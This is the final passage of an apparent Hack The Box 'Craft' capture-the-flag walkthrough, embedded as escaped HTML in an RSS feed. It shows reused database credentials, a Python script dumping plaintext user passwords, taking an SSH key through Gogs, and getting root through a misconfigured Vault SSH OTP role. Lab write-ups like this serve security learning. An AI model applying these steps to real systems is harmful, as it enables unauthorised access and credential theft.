&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_HOST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQLALCHEMY_TRACK_MODIFICATIONS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Another credentials, ok&amp;hellip; but what can we do with them? Well, he is using them to connect to the db so let&amp;rsquo;s do the same:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pymysql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; craft_api &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; settings
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# test connection to mysql database&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pymysql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             db&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             cursorclass&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pymysql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cursors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DictCursor)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; connection&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cursor() &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; cursor:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sql &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from users&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        cursor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute(sql)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cursor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fetchall()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(result)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(result[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    connection&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}
{&amp;#39;id&amp;#39;: 4, &amp;#39;username&amp;#39;: &amp;#39;ebachman&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;llJ77D8QFkLPQB&amp;#39;}
{&amp;#39;id&amp;#39;: 5, &amp;#39;username&amp;#39;: &amp;#39;gilfoyle&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;ZEU3N8WNM2rh4T&amp;#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice we&amp;rsquo;ve now got the credentials for every user.
Now what?&lt;/p&gt;
&lt;p&gt;At this point I thought to SSH with the found credentials, but it didn&amp;rsquo;t work. So after getting into some really deep rabbit holes I&amp;rsquo;ve decided to try to connect to the Gogs page with the new secrets as a last hope.&lt;/p&gt;
&lt;p&gt;And I&amp;rsquo;ve got in with the gilfoyle user, prompted with this:
&lt;img src=&#34;https://i.imgur.com/Zwo1dtQ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note: Don&amp;rsquo;t overcomplicate things, work with what you have and exhaust every possibility before moving on&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve instantly looked at the &lt;code&gt;.ssh&lt;/code&gt; folder and found the private key and therefore got user.&lt;/p&gt;
&lt;h1 id=&#34;getting-root&#34;&gt;Getting root&lt;/h1&gt;
&lt;p&gt;Once I&amp;rsquo;ve got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.&lt;/p&gt;
&lt;p&gt;After looking through almost everything, the &lt;code&gt;vault/secrets.sh&lt;/code&gt; popped as the most interesting to have a look at:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up vault secrets backend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault secrets enable ssh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault write ssh/roles/root_otp &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        key_type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;otp &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        default_user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;root &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        cidr_list&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0.0.0.0/0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the help from Google I&amp;rsquo;ve found &lt;a href=&#34;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&#34;&gt;this&lt;/a&gt;. I&amp;rsquo;ve just followed the article:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vault write ssh/creds/otp_key_role ip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.10.110
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Got the otp and used it to connect through SSH, since root was allowed to login.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
